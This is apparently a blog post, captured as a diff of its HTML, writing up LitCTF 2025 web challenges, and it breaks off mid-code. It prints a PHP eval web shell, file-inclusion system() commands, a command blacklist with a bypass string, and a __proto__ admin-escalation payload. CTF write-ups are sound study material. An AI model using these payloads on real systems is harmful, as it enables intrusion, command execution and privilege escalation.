@@ -1,0 +1,1057 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://chq576.github.io';</script>
+  
+  <title>
+    Litctf2025 |
+    
+    江之岛
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="easy_file（短标签 文件上传 文件包含） 有个登录框，先随便登一个admin&#x2F;admin123,没登成功，但是确实是有admin这个账户存在的且返回admin(YWRtaW4&#x3D;),抓个包，发现YWRtaW4&#x3D;变成了YWRtaW4%3d，base64编码+对特殊字符url编码 到了文件上传界面，php是恶意后缀，且文件内容中不能包括php，所以将里面的php代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Litctf2025">
+<meta property="og:url" content="https://chq576.github.io/2026/03/14/Litctf2025/index.html">
+<meta property="og:site_name" content="江之岛">
+<meta property="og:description" content="easy_file（短标签 文件上传 文件包含） 有个登录框，先随便登一个admin&#x2F;admin123,没登成功，但是确实是有admin这个账户存在的且返回admin(YWRtaW4&#x3D;),抓个包，发现YWRtaW4&#x3D;变成了YWRtaW4%3d，base64编码+对特殊字符url编码 到了文件上传界面，php是恶意后缀，且文件内容中不能包括php，所以将里面的php代码">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://chq576.github.io/img/=.png">
+<meta property="og:image" content="https://chq576.github.io/img/cg.png">
+<meta property="og:image" content="https://chq576.github.io/img/file.png">
+<meta property="og:image" content="https://chq576.github.io/img/%E5%8D%A1%E5%8D%A1.png">
+<meta property="og:image" content="https://chq576.github.io/img/%E7%AE%A1%E7%90%86%E5%91%98.png">
+<meta property="og:image" content="https://chq576.github.io/img/json.png">
+<meta property="og:image" content="https://chq576.github.io/img/%E5%8D%A1%E5%8D%A1.png">
+<meta property="og:image" content="https://chq576.github.io/img/lipsum.png">
+<meta property="og:image" content="https://chq576.github.io/img/lib.png">
+<meta property="article:published_time" content="2026-03-14T13:13:47.000Z">
+<meta property="article:modified_time" content="2026-03-26T15:47:23.175Z">
+<meta property="article:author" content="cc">
+<meta property="article:tag" content="章鱼哥喜欢海绵宝宝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chq576.github.io/img/=.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="江之岛" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <a class="main-nav-link-wrap" href="/">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <span class="main-nav-link">Home</span>
+        </span>
+      
+        <a class="main-nav-link-wrap" href="/archives">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <span class="main-nav-link">Archives</span>
+        </span>
+      
+        <a class="main-nav-link-wrap" href="/about">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <span class="main-nav-link">About</span>
+        </span>
+      
+        <a class="main-nav-link-wrap" href="/friend">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <span class="main-nav-link">Friend</span>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+    
+    
+  </nav>
+  
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture></picture>
+        <img crossorigin="anonymous" fetchpriority="high" src="/images/cc.jpg" alt="Litctf2025">
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">Litctf2025</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content" class="sidebar-left"  >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-file%EF%BC%88%E7%9F%AD%E6%A0%87%E7%AD%BE-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">easy_file（短标签 文件上传 文件包含）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#test-your-nc-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">test_your_nc(命令执行)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%9A%E9%87%8D%E5%AE%87%E5%AE%99%E6%97%A5%E8%AE%B0-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.</span> <span class="toc-text">多重宇宙日记(原型链污染)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF-pop%E9%93%BE-%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0-%E4%BD%BF%E7%94%A8c%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">君の名は(pop链 匿名函数 使用c绕过)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#public-ReflectionFunction-invoke-mixed-%E2%80%A6-args-mixed"><span class="toc-number">4.1.</span> <span class="toc-text">public ReflectionFunction::invoke(mixed …$args): mixed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8C%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">使用C绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%9F%E6%84%BF%E4%BF%A1%E7%AE%B1-ssti"><span class="toc-number">5.</span> <span class="toc-text">星愿信箱(ssti)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%88lipsum%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">法一（lipsum）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%E7%88%86%E7%A0%B4"><span class="toc-number">5.2.</span> <span class="toc-text">法二爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-signin-php%E4%BC%AA%E5%8D%8F%E8%AE%AE-ssrf"><span class="toc-number">6.</span> <span class="toc-text">easy_signin(php伪协议 ssrf)</span></a></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/jn.jpg" data-sizes="auto" alt="cc" class="lazyload">
+  <div class="sidebar-author-name">cc</div>
+  <div class="sidebar-description">章鱼哥喜欢海绵宝宝</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Litctf2025" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-03-14T13:13:47.000Z" itemprop="datePublished">2026-03-14</time>
+    <time style="display: none;" id="post-update-time">2026-03-26</time>
+  </span>
+  
+</div>
+
+      
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="easy-file（短标签-文件上传-文件包含）"><a href="#easy-file（短标签-文件上传-文件包含）" class="headerlink" title="easy_file（短标签 文件上传 文件包含）"></a>easy_file（短标签 文件上传 文件包含）</h1><ol>
+<li>有个登录框，先随便登一个admin&#x2F;admin123,没登成功，但是确实是有admin这个账户存在的且返回admin(YWRtaW4&#x3D;),抓个包，发现YWRtaW4&#x3D;变成了YWRtaW4%3d，base64编码+对特殊字符url编码<br><img src="/./img/=.png" alt="图片"><br><img src="/./img/cg.png" alt="图片"></li>
+<li>到了文件上传界面，php是恶意后缀，且文件内容中不能包括php，所以将里面的php代码改成短标签形式，成功上传短标签.jpg<br><img src="/./img/file.png" alt="图片"></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>3. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get:?file=uploads/短标签.jpg(文件包含)</span><br><span class="line">post:cmd=system(&#x27;ls&#x27;);</span><br><span class="line">cmd=system(&#x27;cat flllag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="test-your-nc-命令执行"><a href="#test-your-nc-命令执行" class="headerlink" title="test_your_nc(命令执行)"></a>test_your_nc(命令执行)</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;input your command&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br></pre></td></tr></table></figure>
+<p>被过滤的字符 &#x2F; 命令：空格、cat、ls、cd、echo、&lt;、${IFS}、sh、反斜杠<br>绕过黑名单，执行系统命令读取 flag<br>c””at$IFS$9&#x2F;f*<br><img src="/./img/%E5%8D%A1%E5%8D%A1.png" alt="图片"></p>
+<h1 id="多重宇宙日记-原型链污染"><a href="#多重宇宙日记-原型链污染" class="headerlink" title="多重宇宙日记(原型链污染)"></a>多重宇宙日记(原型链污染)</h1><ol>
+<li>先随便注册一个账号密码，登录之后去更新自己的个人资料，在源码中发现了这样一段前端代码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// 更新表单的JS提交</span></span><br><span class="line">document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;profileUpdateForm&#x27;</span>).<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, async function(event) &#123;</span><br><span class="line">	event.<span class="title function_ invoke__">preventDefault</span>();</span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">statusEl</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;updateStatus&#x27;</span>);</span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">currentSettingsEl</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">	statusEl.textContent = <span class="string">&#x27;正在更新...&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">formData</span> = <span class="keyword">new</span> <span class="title class_">FormData</span>(event.target);</span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">settingsPayload</span> = &#123;&#125;;<span class="comment">//存储最后要提交的配置数据</span></span><br><span class="line">	<span class="comment">// 构建 settings 对象，只包含有值的字段</span></span><br><span class="line">	<span class="keyword">if</span> (formData.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;theme&#x27;</span>)) settingsPayload.theme = formData.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;theme&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (formData.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;language&#x27;</span>)) settingsPayload.language = formData.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;language&#x27;</span>);</span><br><span class="line">	<span class="comment">// ...可以添加其他字段</span></span><br><span class="line">    <span class="comment">//发送post请求到后端接口</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> <span class="variable constant_">response</span> = await <span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">			<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">			<span class="attr">headers</span>: &#123;</span><br><span class="line">				<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">body</span>: JSON.<span class="title function_ invoke__">stringify</span>(&#123; <span class="attr">settings</span>: settingsPayload &#125;) // 包装在 <span class="string">&quot;settings&quot;</span>键下</span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="keyword">const</span> <span class="variable constant_">result</span> = await response.<span class="title function_ invoke__">json</span>();</span><br><span class="line">		<span class="keyword">if</span> (response.ok) &#123;</span><br><span class="line">			statusEl.textContent = <span class="string">&#x27;成功: &#x27;</span> + result.message;</span><br><span class="line">			currentSettingsEl.textContent = JSON.<span class="title function_ invoke__">stringify</span>(result.settings, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">			<span class="comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span></span><br><span class="line">			<span class="title function_ invoke__">setTimeout</span>(() =&gt; window.location.<span class="title function_ invoke__">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			statusEl.textContent = <span class="string">&#x27;错误: &#x27;</span> + result.message;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">		statusEl.textContent = <span class="string">&#x27;请求失败: &#x27;</span> + error.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送原始JSON的函数</span></span><br><span class="line">async <span class="function"><span class="keyword">function</span> <span class="title">sendRawJson</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">rawJson</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;rawJsonSettings&#x27;</span>).value;</span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">statusEl</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;rawJsonStatus&#x27;</span>);</span><br><span class="line">	<span class="keyword">const</span> <span class="variable constant_">currentSettingsEl</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;currentSettings&#x27;</span>);</span><br><span class="line">	statusEl.textContent = <span class="string">&#x27;正在发送...&#x27;</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> <span class="variable constant_">parsedJson</span> = JSON.<span class="title function_ invoke__">parse</span>(rawJson); <span class="comment">// 确保是合法的JSON</span></span><br><span class="line">		<span class="keyword">const</span> <span class="variable constant_">response</span> = await <span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="line">			<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">			<span class="attr">headers</span>: &#123;</span><br><span class="line">				<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">			<span class="attr">body</span>: JSON.<span class="title function_ invoke__">stringify</span>(parsedJson) // 直接发送用户输入的JSON</span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="keyword">const</span> <span class="variable constant_">result</span> = await response.<span class="title function_ invoke__">json</span>();</span><br><span class="line">		<span class="keyword">if</span> (response.ok) &#123;</span><br><span class="line">			statusEl.textContent = <span class="string">&#x27;成功: &#x27;</span> + result.message;</span><br><span class="line">			currentSettingsEl.textContent = JSON.<span class="title function_ invoke__">stringify</span>(result.settings, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line">			 <span class="comment">// 刷新页面以更新导航栏（如果isAdmin状态改变）</span></span><br><span class="line">			<span class="title function_ invoke__">setTimeout</span>(() =&gt; window.location.<span class="title function_ invoke__">reload</span>(), <span class="number">1000</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			statusEl.textContent = <span class="string">&#x27;错误: &#x27;</span> + result.message;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">		 statusEl.textContent = <span class="string">&#x27;请求失败或JSON无效: &#x27;</span> + error.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>JSON.stringify() 将javascript对象转换为json格式的字符串。</li>
+<li>JSON.parse() 将json字符串转换为javascript字符串。</li>
+<li>FormData 收集表单数据<br>new FormData(event.target)：event.target 是触发提交的表单元素（#profileUpdateForm），FormData 会自动收集表单中所有带 name 属性的输入框值；<br>例如：表单中有 <input name="theme" value="dark">，则 formData.get(‘theme’) 会返回 “dark”。</li>
+<li>const response &#x3D; await fetch(…) 会等待 fetch 请求完成后再执行下一行，避免回调地狱。</li>
+</ul>
+<ol start="2">
+<li>这道题是原型链污染，前端代码中body: JSON.stringify({ settings: settingsPayload })，后端接口（&#x2F;api&#x2F;profile&#x2F;update） 预期收到的格式是{ settings: settingsPayload }。<br><img src="/./img/%E7%AE%A1%E7%90%86%E5%91%98.png" alt="图片"><br>根据页面首页和前端代码中isAdmin的提示，猜测应该是要让我们拿到管理员的权限<br>所以可以使用__proto__,当 lodash.merge 遇到 <strong>proto</strong> 这个键时，会把它当作普通键处理，递归合并到目标对象的原型上,使所有对象都自动拥有isAdmin:true属性，这样就达到权限提升的目的<br><img src="/./img/json.png" alt="图片"></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;:&#123;</span><br><span class="line">        &quot;__proto__&quot;:&#123;</span><br><span class="line">            isAdmin:true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li><img src="/./img/%E5%8D%A1%E5%8D%A1.png" alt="图片"><br>可以发现提交json数据之后出现了红色的管理员字样，点开就可以查看flag了</li>
+</ol>
+<h1 id="君の名は-pop链-匿名函数-使用c绕过"><a href="#君の名は-pop链-匿名函数-使用c绕过" class="headerlink" title="君の名は(pop链 匿名函数 使用c绕过)"></a>君の名は(pop链 匿名函数 使用c绕过)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);<span class="comment">//创建匿名函数，执行/readflag后终止运行</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span 